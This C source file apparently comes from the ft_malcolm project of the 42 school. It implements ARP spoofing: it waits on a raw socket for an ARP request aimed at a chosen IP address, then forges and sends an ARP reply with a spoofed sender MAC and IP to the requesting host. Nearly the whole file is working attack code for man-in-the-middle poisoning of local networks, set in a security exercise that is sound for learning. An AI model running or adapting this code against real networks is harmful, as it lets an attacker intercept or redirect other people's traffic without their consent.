/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   arp_handler.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hulefevr <hulefevr@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/08/07 11:36:52 by hulefevr          #+#    #+#             */
/*   Updated: 2025/08/07 12:26:00 by hulefevr         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/ft_malcolm.h"

int wait_for_arp_request(int sockfd, const struct in_addr *spoofed_ip,
							unsigned char *target_mac_out, unsigned char *target_ip_out)
{
	unsigned char buffer[65536];
	
	while (running) {
		ssize_t len = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (len < 0) {
			if (errno == EINTR)
				continue; // Interrupted by signal, retry
			printf("ft_malcolm: recvfrom failed: %s\n", strerror(errno));
			return -1; // Error receiving data
		}
		
		struct ether_header *eth = (struct ether_header *)buffer;
		if (ntohs(eth->ether_type) != ETHERTYPE_ARP) {
			continue; // Not an ARP packet, ignore
		}

		struct ether_arp *arp = (struct ether_arp *) (buffer + sizeof(struct ether_header));
		if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST) {
			continue; // Not an ARP request, ignore
		}
		
		struct in_addr dest_ip;
		ft_memcpy(&dest_ip, arp->arp_tpa, 4);
		if (ft_memcmp(&dest_ip, spoofed_ip, 4) != 0) {
			continue; // Not the IP we are spoofing, ignore
		}
		
		printf("Received ARP request for %s\n", inet_ntoa(dest_ip));

		ft_memcpy(target_mac_out, arp->arp_sha, 6);
		ft_memcpy(target_ip_out, arp->arp_spa, 4);
		return 0; // Successfully received ARP request
	}
	return -1; // Running flag was set to false, exit gracefully
	
	
}

int	send_arp_reply(int sockfd, const char *if_name, const unsigned char *src_mac,
					const struct in_addr *src_ip, const unsigned char *target_mac, const struct in_addr *target_ip)
{
	unsigned char		buffer[42]; // Ethernet header (14) + ARP header (28)
	struct ether_header	*eth = (struct ether_header *)buffer;
	struct ether_arp	*arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));
	struct sockaddr_ll	socket_addr;
	int 				if_index;

	// ================= Ethernet Header =================
	
	ft_memcpy(eth->ether_dhost, target_mac, 6);	// Destination MAC address
	ft_memcpy(eth->ether_shost, src_mac, 6);	// Source MAC address
	eth->ether_type = htons(ETHERTYPE_ARP);		// Ethernet type for ARP

	// ================= ARP Header =================

	arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);	// Hardware type: Ethernet
	arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);	// Protocol type: IPv4
	arp->ea_hdr.ar_hln = 6;						// Hardware address length
	arp->ea_hdr.ar_pln = 4;						// Protocol address length
	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);		// Operation: ARP reply
	
	ft_memcpy(arp->arp_sha, src_mac, 6);		// Sender MAC (spoofed)
	ft_memcpy(arp->arp_spa, src_ip, 4);			// Sender IP (spoofed)
	ft_memcpy(arp->arp_tha, target_mac, 6);		// Target MAC (original)
	ft_memcpy(arp->arp_tpa, target_ip, 4);		// Target IP (original)	

	// ================= Socket Address =================

	if_index = if_nametoindex(if_name);
	if (if_index == 0) {
		fprintf(stderr, "ft_malcolm: failed to get interface index for %s: %s\n", if_name, strerror(errno));
		return -1;
	}

	ft_memset(&socket_addr, 0, sizeof(struct sockaddr_ll));
	socket_addr.sll_family = AF_PACKET;
	socket_addr.sll_halen = ETH_ALEN;
	socket_addr.sll_ifindex = if_index;
	ft_memcpy(socket_addr.sll_addr, target_mac, 6); // Set destination MAC address

	// ================= Verbose Output =================
	printf("Sending ARP reply:\n");
	printf("  From MAC %02x:%02x:%02x:%02x:%02x:%02x  IP %s\n",
		src_mac[0], src_mac[1], src_mac[2],
		src_mac[3], src_mac[4], src_mac[5],
		inet_ntoa(*src_ip));
	printf("  To   MAC %02x:%02x:%02x:%02x:%02x:%02x  IP %s\n",
		target_mac[0], target_mac[1], target_mac[2],
		target_mac[3], target_mac[4], target_mac[5],
		inet_ntoa(*target_ip));

	// ================= Envoi =================

	if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&socket_addr, sizeof(struct sockaddr_ll)) < 0)
	{
		printf("ft_malcolm: sendto failed: %s\n", strerror(errno));
		return -1; // Error sending ARP reply
	}
	
	printf("ft_malcolm: ARP reply sent successfully.\n");
	return 0; // Successfully sent ARP reply

}